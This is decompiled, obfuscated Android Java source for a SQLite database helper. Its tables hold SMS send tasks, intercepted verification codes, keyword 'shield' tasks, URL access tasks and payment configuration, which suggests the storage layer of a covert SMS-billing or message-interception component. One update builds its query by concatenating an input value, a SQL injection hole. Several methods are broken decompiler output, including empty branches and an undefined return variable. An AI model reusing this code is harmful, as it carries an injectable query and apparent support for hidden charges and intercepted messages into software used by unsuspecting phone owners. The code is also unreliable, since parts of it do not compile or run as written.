package com.android.k9op.OL.HI;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import com.android.k9op.OL.anvYnsl.k9op.HI;
import com.android.k9op.OL.anvYnsl.k9op.JUSEF;
import com.android.k9op.OL.anvYnsl.k9op.anvYnsl;
import com.android.k9op.OL.anvYnsl.k9op.jose;
import com.android.k9op.OL.anvYnsl.k9op.sqa;
import com.android.k9op.OL.anvYnsl.k9op.wjfwe;
import com.android.k9op.OL.k9op.SDS;
import com.android.k9op.k9op.OL;
import com.umeng.analytics.pro.d;
import java.util.ArrayList;
import java.util.Iterator;
/* loaded from: classes.dex */
public final class k9op extends SQLiteOpenHelper {
    private static final byte[] ND89akd = new byte[0];

    public k9op(Context context, String str, SQLiteDatabase.CursorFactory cursorFactory, int i) {
        super(context, str, (SQLiteDatabase.CursorFactory) null, 2);
    }

    private static com.android.k9op.OL.k9op.k9op ND89akd(Cursor cursor) {
        com.android.k9op.OL.k9op.k9op k9opVar = new com.android.k9op.OL.k9op.k9op();
        if (cursor != null && cursor.moveToFirst()) {
            k9opVar.ND89akd(cursor.getInt(cursor.getColumnIndex("id")));
            k9opVar.ND89akd(OL.OPj2s(cursor.getString(cursor.getColumnIndex("name"))));
            k9opVar.owdCd(cursor.getInt(cursor.getColumnIndex("type")));
            k9opVar.Uyns1s(cursor.getInt(cursor.getColumnIndex("status")));
        }
        if (cursor != null) {
            cursor.close();
        }
        return k9opVar;
    }

    private int OKjhqz() {
        int i = 0;
        synchronized (ND89akd) {
            try {
                i = getWritableDatabase().delete("mp_status", "flag=?", new String[]{"1"});
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return i;
    }

    private int OPj2s(String str, String str2) {
        try {
            return getWritableDatabase().delete("verify_intercept_info", "soid=? and subid=?", new String[]{str, str2});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int Pv(String str) {
        try {
            return getWritableDatabase().delete("tasklist", "moid=? ", new String[]{str});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int Uyns1s(String str, String str2) {
        try {
            return getWritableDatabase().delete("send_sms", "soid=? and subid=?", new String[]{str, str2});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private static ContentValues Uyns1s(com.android.k9op.OL.k9op.OL ol) {
        ContentValues contentValues = new ContentValues();
        if (OL.owdCd(ol)) {
            String ND89akd2 = ol.ND89akd();
            String Uyns1s = OL.Uyns1s(ol.owdCd(), "Goods");
            String Uyns1s2 = OL.Uyns1s(ol.Uyns1s(), "Goods");
            String Uyns1s3 = OL.Uyns1s(ol.ui2Abh(), "Goods");
            String Uyns1s4 = OL.Uyns1s(ol.OPj2s(), "Goods");
            String Uyns1s5 = OL.Uyns1s(String.valueOf(ol.uoer5H()), "Goods");
            String Uyns1s6 = OL.Uyns1s(ol.Yja1OJm(), "Goods");
            contentValues.put("sign", ND89akd2);
            contentValues.put("n", Uyns1s);
            contentValues.put("yfS", Uyns1s2);
            contentValues.put("yjS", Uyns1s3);
            contentValues.put("zzS", Uyns1s4);
            contentValues.put("p", Uyns1s5);
            contentValues.put("d", Uyns1s6);
        }
        return contentValues;
    }

    private static ContentValues Uyns1s(SDS sds) {
        ContentValues contentValues = new ContentValues();
        contentValues.put("needMobile", Integer.valueOf(sds.Yja1OJm()));
        contentValues.put("quickFeedback", Integer.valueOf(sds.OKjhqz()));
        contentValues.put("needConfirm", Integer.valueOf(sds.ln8DL()));
        contentValues.put("availablePayType", sds.nmpPdk());
        contentValues.put("smsCat", sds.f6ksTc());
        contentValues.put("showResultUI", Integer.valueOf(sds.k9op()));
        contentValues.put("needUpdateDomain", Integer.valueOf(sds.bC()));
        contentValues.put("showLoading", Integer.valueOf(sds.YNc()));
        contentValues.put("preMobile", Integer.valueOf(sds.m4T()));
        contentValues.put("logCount", Integer.valueOf(sds.GA()));
        contentValues.put("yfId", sds.ND89akd());
        contentValues.put("yjId", sds.owdCd());
        contentValues.put("zzDId", sds.Uyns1s());
        contentValues.put("zzAId", sds.ui2Abh());
        contentValues.put("zzSec", sds.OPj2s());
        return contentValues;
    }

    private int YNc() {
        try {
            return getWritableDatabase().delete("shield_task", "st = ? or dl < ?", new String[]{"1", String.valueOf(System.currentTimeMillis() / 1000)});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int Yja1OJm() {
        int i;
        synchronized (ND89akd) {
            i = 0;
            try {
                i = getWritableDatabase().delete("orders", null, null);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return i;
    }

    private com.android.k9op.OL.k9op.k9op Yja1OJm(int i) {
        com.android.k9op.OL.k9op.k9op k9opVar;
        synchronized (this) {
            com.android.k9op.OL.k9op.k9op k9opVar2 = new com.android.k9op.OL.k9op.k9op();
            if (OL.ND89akd(Integer.valueOf(i))) {
                return k9opVar2;
            }
            try {
                Cursor query = getReadableDatabase().query("Doms", null, "id=?", new String[]{String.valueOf(i)}, null, null, null);
                k9opVar2 = ND89akd(query);
                if (query != null) {
                    query.close();
                }
                k9opVar = k9opVar2;
            } catch (Exception e) {
                e.printStackTrace();
                k9opVar = k9opVar2;
            }
            return k9opVar;
        }
    }

    private int bC() {
        try {
            return getWritableDatabase().delete("verify_intercept_info", null, null);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int f6ksTc() {
        try {
            return getWritableDatabase().delete("url_access_task", null, null);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int k9op() {
        try {
            return getWritableDatabase().delete("parsetask", null, null);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int ln8DL() {
        try {
            return getWritableDatabase().delete("tasklist", null, null);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int nmpPdk() {
        try {
            return getWritableDatabase().delete("send_sms", null, null);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int owdCd(int i, int i2) {
        int i3 = 0;
        synchronized (this) {
            if (!OL.ND89akd(Integer.valueOf(i))) {
                try {
                    SQLiteDatabase writableDatabase = getWritableDatabase();
                    ContentValues contentValues = new ContentValues();
                    contentValues.put("status", Integer.valueOf(i2));
                    i3 = writableDatabase.update("Doms", contentValues, "id=?", new String[]{String.valueOf(i)});
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return i3;
    }

    private int ui2Abh(String str, String str2) {
        try {
            return getWritableDatabase().delete("url_access_task", "soid=? and subid=?", new String[]{str, str2});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int uoer5H(String str, String str2) {
        try {
            return getWritableDatabase().delete("shield_task", "st = ? or dl < ? and soid=? and subid=?", new String[]{"1", String.valueOf(System.currentTimeMillis() / 1000), str, str2});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    private int xsR(String str) {
        try {
            return getWritableDatabase().delete("parsetask", "moid=? ", new String[]{str});
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    public final wjfwe GA(String str) {
        wjfwe wjfweVar;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("tasklist", null, "moid=? ", new String[]{str}, null, null, "id desc");
                if (query == null || !query.moveToFirst()) {
                    wjfweVar = null;
                } else {
                    wjfweVar = new wjfwe();
                    try {
                        wjfweVar.ND89akd(query.getInt(query.getColumnIndex("id")));
                        wjfweVar.ND89akd(query.getString(query.getColumnIndex("moid")));
                        wjfweVar.owdCd(query.getString(query.getColumnIndex("soid")));
                        wjfweVar.owdCd(Integer.parseInt(query.getString(query.getColumnIndex("subid"))));
                        wjfweVar.Uyns1s(Integer.parseInt(query.getString(query.getColumnIndex("status"))));
                        wjfweVar.ui2Abh(Integer.parseInt(query.getString(query.getColumnIndex("type"))));
                        wjfweVar.ND89akd(Long.parseLong(query.getString(query.getColumnIndex("tp"))));
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return wjfweVar;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (SQLException e3) {
                e = e3;
                wjfweVar = null;
            }
        }
        return wjfweVar;
    }

    public final int ND89akd(int i) {
        int i2 = 0;
        synchronized (this) {
            if (i > 0) {
                com.android.k9op.OL.k9op.k9op Yja1OJm = Yja1OJm(i);
                if (!OL.ND89akd(Yja1OJm) && Yja1OJm.ND89akd() != 0 && Yja1OJm.ui2Abh() > 0) {
                    i2 = owdCd(i, Yja1OJm.ui2Abh() - 1);
                }
            }
        }
        return i2;
    }

    public final long ND89akd(com.android.k9op.OL.k9op.OL ol) {
        long j = 0;
        synchronized (this) {
            if (ol != null) {
                try {
                    j = getWritableDatabase().insert("GSI", null, Uyns1s(ol));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return j;
    }

    public final long ND89akd(SDS sds) {
        long j = 0;
        synchronized (this) {
            if (sds != null) {
                try {
                    j = getWritableDatabase().insert("pay_configure", null, Uyns1s(sds));
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return j;
    }

    public final long ND89akd(com.android.k9op.OL.k9op.k9op k9opVar) {
        long j = 0;
        synchronized (this) {
            if (!OL.ND89akd(k9opVar)) {
                try {
                    SQLiteDatabase writableDatabase = getWritableDatabase();
                    ContentValues contentValues = new ContentValues();
                    contentValues.put("name", OL.ui2Abh(k9opVar.owdCd()));
                    contentValues.put("type", Integer.valueOf(k9opVar.Uyns1s()));
                    contentValues.put("status", Integer.valueOf(k9opVar.ui2Abh()));
                    j = writableDatabase.insert("Doms", null, contentValues);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return j;
    }

    public final anvYnsl ND89akd(String str, int i) {
        anvYnsl anvynsl;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("send_sms", null, "soid=? and subid=?", new String[]{str, String.valueOf(i)}, null, null, "id desc");
                if (query == null || !query.moveToFirst()) {
                    anvynsl = null;
                } else {
                    anvynsl = new anvYnsl();
                    try {
                        anvynsl.ND89akd(query.getInt(query.getColumnIndex("id")));
                        anvynsl.OPj2s(query.getString(query.getColumnIndex("soid")));
                        anvynsl.owdCd(query.getInt(query.getColumnIndex("subid")));
                        anvynsl.Uyns1s(query.getInt(query.getColumnIndex("type")));
                        anvynsl.uoer5H(query.getString(query.getColumnIndex("dt")));
                        anvynsl.ui2Abh(query.getInt(query.getColumnIndex("st")));
                        anvynsl.ND89akd(query.getLong(query.getColumnIndex("tp")));
                        anvynsl.OPj2s(query.getInt(query.getColumnIndex("followed")));
                        anvynsl.owdCd(query.getLong(query.getColumnIndex("btp")));
                        anvynsl.Uyns1s(query.getLong(query.getColumnIndex("dl")));
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return anvynsl;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (SQLException e3) {
                e = e3;
                anvynsl = null;
            }
        }
        return anvynsl;
    }

    public final com.android.k9op.OL.k9op.OL ND89akd(String str) {
        Exception e;
        com.android.k9op.OL.k9op.OL ol;
        int i = 0;
        synchronized (this) {
            com.android.k9op.OL.k9op.OL ol2 = new com.android.k9op.OL.k9op.OL();
            if (OL.ND89akd((Object) str)) {
                return ol2;
            }
            try {
                Cursor query = getReadableDatabase().query("GSI", null, "sign=?", new String[]{str}, null, null, null);
                com.android.k9op.OL.k9op.OL ol3 = new com.android.k9op.OL.k9op.OL();
                if (query != null && query.moveToFirst()) {
                    String string = query.getString(query.getColumnIndex("sign"));
                    String string2 = query.getString(query.getColumnIndex("n"));
                    String string3 = query.getString(query.getColumnIndex("yfS"));
                    String string4 = query.getString(query.getColumnIndex("yjS"));
                    String string5 = query.getString(query.getColumnIndex("zzS"));
                    String string6 = query.getString(query.getColumnIndex("p"));
                    String string7 = query.getString(query.getColumnIndex("d"));
                    String ui2Abh = OL.ui2Abh(string2, "Goods");
                    String ui2Abh2 = OL.ui2Abh(string3, "Goods");
                    String ui2Abh3 = OL.ui2Abh(string4, "Goods");
                    String ui2Abh4 = OL.ui2Abh(string5, "Goods");
                    String ui2Abh5 = OL.ui2Abh(string6, "Goods");
                    String ui2Abh6 = OL.ui2Abh(string7, "Goods");
                    if (OL.owdCd((Object) ui2Abh5)) {
                        i = Integer.parseInt(ui2Abh5);
                    }
                    ol3.ND89akd(string);
                    ol3.owdCd(ui2Abh);
                    ol3.Uyns1s(ui2Abh2);
                    ol3.ui2Abh(ui2Abh3);
                    ol3.OPj2s(ui2Abh4);
                    ol3.ND89akd(i);
                    ol3.uoer5H(ui2Abh6);
                }
                if (query != null) {
                    try {
                        query.close();
                    } catch (Exception e2) {
                        e = e2;
                        ol2 = ol3;
                        e.printStackTrace();
                        ol = ol2;
                        return ol;
                    }
                }
                ol = ol3;
            } catch (Exception e3) {
                e = e3;
            }
            return ol;
        }
    }

    public final SDS ND89akd() {
        SDS sds;
        Exception e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("pay_configure", null, "id=?", new String[]{"1"}, null, null, null);
                if (query == null || !query.moveToFirst()) {
                    sds = null;
                } else {
                    sds = new SDS();
                    try {
                        sds.ND89akd(query.getInt(query.getColumnIndex("id")));
                        sds.owdCd(query.getInt(query.getColumnIndex("needMobile")));
                        sds.Uyns1s(query.getInt(query.getColumnIndex("quickFeedback")));
                        sds.ui2Abh(query.getInt(query.getColumnIndex("needConfirm")));
                        sds.uoer5H(query.getString(query.getColumnIndex("availablePayType")));
                        sds.Yja1OJm(query.getString(query.getColumnIndex("smsCat")));
                        sds.OPj2s(query.getInt(query.getColumnIndex("showResultUI")));
                        sds.uoer5H(query.getInt(query.getColumnIndex("needUpdateDomain")));
                        sds.Yja1OJm(query.getInt(query.getColumnIndex("showLoading")));
                        sds.OKjhqz(query.getInt(query.getColumnIndex("preMobile")));
                        sds.ln8DL(query.getInt(query.getColumnIndex("logCount")));
                        sds.ND89akd(query.getString(query.getColumnIndex("yfId")));
                        sds.owdCd(query.getString(query.getColumnIndex("yjId")));
                        sds.Uyns1s(query.getString(query.getColumnIndex("zzDId")));
                        sds.ui2Abh(query.getString(query.getColumnIndex("zzAId")));
                        sds.OPj2s(query.getString(query.getColumnIndex("zzSec")));
                    } catch (Exception e2) {
                        e = e2;
                        e.printStackTrace();
                        return sds;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (Exception e3) {
                e = e3;
                sds = null;
            }
        }
        return sds;
    }

    public final void ND89akd(String str, String str2, String str3) {
        Uyns1s(str2, str3);
        ui2Abh(str2, str3);
        xsR(str);
        OPj2s(str2, str3);
        uoer5H(str2, str3);
        Pv(str);
    }

    public final boolean ND89akd(int i, int i2) {
        int i3;
        boolean z = true;
        synchronized (this) {
            ContentValues contentValues = new ContentValues();
            contentValues.put("st", Integer.valueOf(i2));
            try {
                i3 = getWritableDatabase().update("parsetask", contentValues, "id =? and st<?", new String[]{String.valueOf(i), String.valueOf(i2)});
            } catch (SQLException e) {
                e.printStackTrace();
                i3 = 0;
            }
            if (i3 <= 0) {
                z = false;
            }
        }
        return z;
    }

    public final boolean ND89akd(int i, String str) {
        com.android.k9op.OL.anvYnsl.k9op.SDS sds = new com.android.k9op.OL.anvYnsl.k9op.SDS();
        sds.owdCd(i);
        sds.ND89akd(str);
        sds.Uyns1s(0);
        return ND89akd(sds);
    }

    public final boolean ND89akd(HI hi) {
        long j;
        boolean z = false;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("oid", hi.ND89akd());
                contentValues.put("cpoid", hi.owdCd());
                contentValues.put("ext", hi.ui2Abh());
                contentValues.put("gid", hi.Uyns1s());
                contentValues.put("st", (Integer) 0);
                contentValues.put("tp", Long.valueOf(hi.OPj2s()));
                contentValues.put("dl", Long.valueOf(hi.uoer5H()));
                contentValues.put("resToCp", Integer.valueOf(hi.Yja1OJm()));
                contentValues.put("isMPFinished", Integer.valueOf(hi.OKjhqz()));
                j = writableDatabase.insert("orders", null, contentValues);
            } catch (Exception e) {
                e.printStackTrace();
                j = 0;
            }
            if (j > 0) {
                z = true;
            }
        }
        return z;
    }

    public final boolean ND89akd(JUSEF jusef) {
        long j;
        boolean z;
        synchronized (this) {
            try {
                ContentValues contentValues = new ContentValues();
                contentValues.put("soid", jusef.ND89akd());
                contentValues.put("subid", Integer.valueOf(jusef.owdCd()));
                contentValues.put("pt", jusef.ui2Abh());
                contentValues.put("kw", jusef.OPj2s());
                contentValues.put("st", Integer.valueOf(jusef.uoer5H()));
                contentValues.put("followed", Integer.valueOf(jusef.Yja1OJm()));
                contentValues.put("btp", Long.valueOf(jusef.OKjhqz()));
                contentValues.put("dl", Long.valueOf(jusef.ln8DL()));
                j = getWritableDatabase().insert("shield_task", null, contentValues);
            } catch (Exception e) {
                e.printStackTrace();
                j = 0;
            }
            z = j > 0;
        }
        return z;
    }

    public final boolean ND89akd(com.android.k9op.OL.anvYnsl.k9op.OL ol) {
        long j;
        boolean z;
        synchronized (this) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("soid", ol.ND89akd());
                contentValues.put("subid", Integer.valueOf(ol.owdCd()));
                contentValues.put("sendtype", Integer.valueOf(ol.Uyns1s()));
                contentValues.put("url", ol.ui2Abh());
                contentValues.put("httpmethod", ol.OPj2s());
                contentValues.put("httpdata", ol.uoer5H());
                contentValues.put("httpParams", ol.Yja1OJm());
                contentValues.put("httpHeader", ol.OKjhqz());
                contentValues.put("status", Integer.valueOf(ol.ln8DL()));
                contentValues.put("errorcode", Integer.valueOf(ol.nmpPdk()));
                contentValues.put("followed", Integer.valueOf(ol.f6ksTc()));
                contentValues.put("btp", Long.valueOf(ol.k9op()));
                contentValues.put("dl", Long.valueOf(ol.bC()));
                j = writableDatabase.insert("url_access_task", null, contentValues);
            } catch (SQLException e) {
                e.printStackTrace();
                j = 0;
            }
            z = j > 0;
        }
        return z;
    }

    public final boolean ND89akd(com.android.k9op.OL.anvYnsl.k9op.SDS sds) {
        boolean z = false;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("type", Integer.valueOf(sds.owdCd()));
                contentValues.put("info", sds.Uyns1s());
                contentValues.put("flag", Integer.valueOf(sds.ui2Abh()));
                if (writableDatabase.insert("mp_status", null, contentValues) > 0) {
                    z = true;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return z;
    }

    public final boolean ND89akd(anvYnsl anvynsl) {
        long j;
        boolean z;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("type", Integer.valueOf(anvynsl.Yja1OJm()));
                contentValues.put("soid", anvynsl.OPj2s());
                contentValues.put("subid", Integer.valueOf(anvynsl.uoer5H()));
                contentValues.put("dt", anvynsl.OKjhqz());
                contentValues.put("st", Integer.valueOf(anvynsl.ln8DL()));
                contentValues.put("tp", Long.valueOf(anvynsl.nmpPdk()));
                contentValues.put("btp", Long.valueOf(anvynsl.k9op()));
                contentValues.put("dl", Long.valueOf(anvynsl.bC()));
                contentValues.put("followed", Integer.valueOf(anvynsl.f6ksTc()));
                j = writableDatabase.insert("send_sms", null, contentValues);
            } catch (Exception e) {
                e.printStackTrace();
                j = 0;
            }
            z = j > 0;
        }
        return z;
    }

    public final boolean ND89akd(jose joseVar) {
        long j;
        boolean z;
        synchronized (this) {
            try {
                ContentValues contentValues = new ContentValues();
                contentValues.put("soid", joseVar.ND89akd());
                contentValues.put("subid", Integer.valueOf(joseVar.owdCd()));
                contentValues.put("cp", joseVar.Yja1OJm());
                contentValues.put(d.b.a.f1148a, joseVar.OKjhqz());
                contentValues.put("st", Integer.valueOf(joseVar.ln8DL()));
                contentValues.put("followed", Integer.valueOf(joseVar.nmpPdk()));
                contentValues.put("btp", Long.valueOf(joseVar.OPj2s()));
                contentValues.put("dl", Long.valueOf(joseVar.ui2Abh()));
                contentValues.put("sc", Integer.valueOf(joseVar.Uyns1s()));
                j = getWritableDatabase().insert("verify_intercept_info", null, contentValues);
            } catch (SQLException e) {
                e.printStackTrace();
                j = 0;
            }
            z = j > 0;
        }
        return z;
    }

    public final boolean ND89akd(sqa sqaVar) {
        long j;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("moid", sqaVar.Uyns1s());
                contentValues.put("soid", sqaVar.ui2Abh());
                contentValues.put("subId", Integer.valueOf(sqaVar.ND89akd()));
                contentValues.put("msg", sqaVar.OPj2s());
                contentValues.put("st", Integer.valueOf(sqaVar.uoer5H()));
                contentValues.put("type", Integer.valueOf(sqaVar.Yja1OJm()));
                contentValues.put("btp", Long.valueOf(sqaVar.OKjhqz()));
                contentValues.put("dl", Long.valueOf(sqaVar.ln8DL()));
                j = writableDatabase.insert("parsetask", null, contentValues);
            } catch (Exception e) {
                e.printStackTrace();
                j = 0;
            }
            return j > 0;
        }
    }

    public final boolean ND89akd(wjfwe wjfweVar) {
        boolean z = false;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("moid", wjfweVar.ND89akd());
                contentValues.put("soid", wjfweVar.owdCd());
                contentValues.put("subid", Integer.valueOf(wjfweVar.Uyns1s()));
                contentValues.put("status", Integer.valueOf(wjfweVar.ui2Abh()));
                contentValues.put("type", Integer.valueOf(wjfweVar.OPj2s()));
                contentValues.put("tp", Long.valueOf(wjfweVar.uoer5H()));
                if (writableDatabase.insert("tasklist", null, contentValues) > 0) {
                    z = true;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return z;
    }

    public final boolean ND89akd(String str, int i, int i2) {
        int i3;
        boolean z = true;
        synchronized (this) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("status", Integer.valueOf(i2));
                if (str == null || "null".equals(str)) {
                    str = "";
                }
                i3 = writableDatabase.update("tasklist", contentValues, "type=? and soid=? and subid=? and status<=?", new String[]{"1", str, String.valueOf(i), "0"});
            } catch (SQLException e) {
                e.printStackTrace();
                i3 = 0;
            }
            if (i3 <= 0) {
                z = false;
            }
        }
        return z;
    }

    public final boolean ND89akd(String str, String str2) {
        int i;
        boolean z = false;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("oid", str);
                i = writableDatabase.update("orders", contentValues, "cpoid='" + str2 + "'", null);
            } catch (Exception e) {
                e.printStackTrace();
                i = 0;
            }
            if (i > 0) {
                z = true;
            }
        }
        return z;
    }

    public final boolean ND89akd(ArrayList arrayList) {
        int i;
        if (arrayList == null || arrayList.size() == 0) {
            return false;
        }
        String str = "";
        String[] strArr = new String[arrayList.size()];
        Iterator it = arrayList.iterator();
        int i2 = 0;
        while (it.hasNext()) {
            str = str + " or id=? ";
            strArr[i2] = String.valueOf(((Integer) it.next()).intValue());
            i2++;
        }
        if ("".equals(str)) {
            return false;
        }
        String substring = str.substring(4);
        synchronized (ND89akd) {
            SQLiteDatabase writableDatabase = getWritableDatabase();
            try {
                ContentValues contentValues = new ContentValues();
                contentValues.put("flag", (Integer) 1);
                i = writableDatabase.update("mp_status", contentValues, substring, strArr);
            } catch (Exception e) {
                e.printStackTrace();
                i = 0;
            }
        }
        return i > 0;
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x0042  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x004e  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean OKjhqz(String str) {
        int i;
        Exception e;
        synchronized (this) {
            if (OL.ND89akd((Object) str)) {
                return false;
            }
            try {
                Cursor query = getReadableDatabase().query("orders", new String[]{"isMPFinished"}, "cpoid=?", new String[]{str}, null, null, null);
                i = (query == null || !query.moveToFirst()) ? 0 : query.getInt(query.getColumnIndex("isMPFinished"));
                if (query != null) {
                    try {
                        query.close();
                    } catch (Exception e2) {
                        e = e2;
                        e.printStackTrace();
                        if (i == 1) {
                        }
                        return r0;
                    }
                }
            } catch (Exception e3) {
                e = e3;
                i = 0;
            }
            boolean z = i == 1;
            return z;
        }
    }

    public final jose OPj2s(int i) {
        jose joseVar;
        SQLException e;
        synchronized (this) {
            try {
                Cursor query = getReadableDatabase().query("verify_intercept_info", null, "subid=?", new String[]{String.valueOf(i)}, null, null, null);
                if (query == null || !query.moveToFirst()) {
                    joseVar = null;
                } else {
                    joseVar = new jose();
                    try {
                        joseVar.Uyns1s(query.getInt(query.getColumnIndex("id")));
                        joseVar.ND89akd(query.getString(query.getColumnIndex("soid")));
                        joseVar.ND89akd(query.getInt(query.getColumnIndex("subid")));
                        joseVar.owdCd(query.getString(query.getColumnIndex("cp")));
                        joseVar.Uyns1s(query.getString(query.getColumnIndex(d.b.a.f1148a)));
                        joseVar.ui2Abh(query.getInt(query.getColumnIndex("st")));
                        joseVar.OPj2s(query.getInt(query.getColumnIndex("followed")));
                        joseVar.owdCd(query.getLong(query.getColumnIndex("btp")));
                        joseVar.ND89akd(query.getLong(query.getColumnIndex("dl")));
                    } catch (SQLException e2) {
                        e = e2;
                        e.printStackTrace();
                        return joseVar;
                    }
                }
                if (query != null) {
                    query.close();
                }
            } catch (SQLException e3) {
                e = e3;
                joseVar = null;
            }
        }
        return joseVar;
    }

    public final void OPj2s() {
        OKjhqz();
        Yja1OJm();
    }

    public final boolean OPj2s(String str) {
        int i;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase writableDatabase = getWritableDatabase();
                ContentValues contentValues = new ContentValues();
                contentValues.put("isMPFinished", (Integer) 1);
                i = writableDatabase.update("orders", contentValues, "cpoid=? and isMPFinished=?", new String[]{str, String.valueOf(0)});
            } catch (Exception e) {
                e.printStackTrace();
                i = 0;
            }
            return i > 0;
        }
    }

    public final com.android.k9op.OL.k9op.k9op Uyns1s(String str) {
        com.android.k9op.OL.k9op.k9op k9opVar;
        synchronized (this) {
            com.android.k9op.OL.k9op.k9op k9opVar2 = new com.android.k9op.OL.k9op.k9op();
            if (OL.ND89akd((Object) str)) {
                return k9opVar2;
            }
            try {
                Cursor query = getReadableDatabase().query("Doms", null, "name=?", new String[]{OL.Uyns1s(str, "Domains")}, null, null, null);
                k9opVar2 = ND89akd(query);
                if (query != null) {
                    query.close();
                }
                k9opVar = k9opVar2;
            } catch (Exception e) {
                e.printStackTrace();
                k9opVar = k9opVar2;
            }
            return k9opVar;
        }
    }

    public final String Uyns1s(int i) {
        synchronized (this) {
            String str = "";
            if (i == 0) {
                return str;
            }
            try {
                Cursor query = getReadableDatabase().query("Actions", new String[]{"action"}, "type=?", new String[]{String.valueOf(i)}, null, null, null);
                if (query != null && query.moveToFirst()) {
                    str = query.getString(query.getColumnIndex("action"));
                }
                if (query != null) {
                    query.close();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            return OL.OPj2s(str);
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:15:0x006f A[Catch: all -> 0x007a, Exception -> 0x007d, TRY_LEAVE, TryCatch #0 {Exception -> 0x007d, blocks: (B:5:0x000d, B:7:0x0023, B:9:0x0029, B:11:0x0054, B:12:0x0067, B:15:0x006f), top: B:25:0x000d }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final ArrayList Uyns1s() {
        Exception e;
        ArrayList arrayList;
        Cursor query;
        ArrayList arrayList2 = null;
        synchronized (ND89akd) {
            try {
                SQLiteDatabase readableDatabase = getReadableDatabase();
                arrayList = new ArrayList();
                try {
                    query = readableDatabase.query("mp_status", null, "flag=?", new String[]{"0"}, null, null, null);
                } catch (Exception e2) {
                    e = e2;
                    arrayList2 = arrayList;
                    e.printStackTrace();
                    arrayList = arrayList2;
                    return arrayList;
                }
            } catch (Exception e3) {
                e = e3;
            }
            if (query != null && query.moveToFirst()) {
                do {
                    com.android.k9op.OL.anvYnsl.k9op.SDS sds = new com.android.k9op.OL.anvYnsl.k9op.SDS();
                    sds.ND89akd(query.getInt(query.getColumnIndex("id")));
                    sds.ND89akd(query.getString(query.getColumnIndex("info")));
                    int i = query.getInt(query.getColumnIndex("type"));
                    if (i != 0) {
                        sds.owdCd(i);
                        sds.Uyns1s(query.getInt(query.getColumnIndex("flag")));
                        arrayList.add(sds);
                    }
                } while (query.moveToNext());
                if (query != null) {
                }
            } else if (query != null) {
                query.close();
            }
        }
        return arrayList;
    }

    /* JADX WARN: Removed duplicated region for block: B:11:0x004d A[Catch: SQLException -> 0x0052, all -> 0x0057, TRY_LEAVE, TryCatch #1 {SQLException -> 0x0052, blocks: (B:4:0x0006, B:6:0x002a, B:8:0x0030, B:11:0x004d), top: B:20:0x0006, outer: #0 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final ArrayList YNc(String str) {
        ArrayList arrayList;
        Cursor query;
        synchronized (this) {
            arrayList = new ArrayList();
            try {
                query = getReadableDatabase().query("tasklist", new String[]{"distinct type"}, "moid=? and status=?", new String[]{str, "-1"}, null, null, null);
            } catch (SQLException e) {
                e.printStackTrace();
            }
            if (query != null && query.moveToFirst()) {
                do {
                    arrayList.add(Integer.valueOf(Integer.parseInt(query.getString(query.getColumnIndex("type")))));
                } while (query.moveToNext());
                if (query != null) {
                }
            } else if (query != null) {
                query.close();
            }
        }
        return arrayList;
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x0042  */
    /* JADX WARN: Removed duplicated region for block: B:24:0x004e  */
    /*
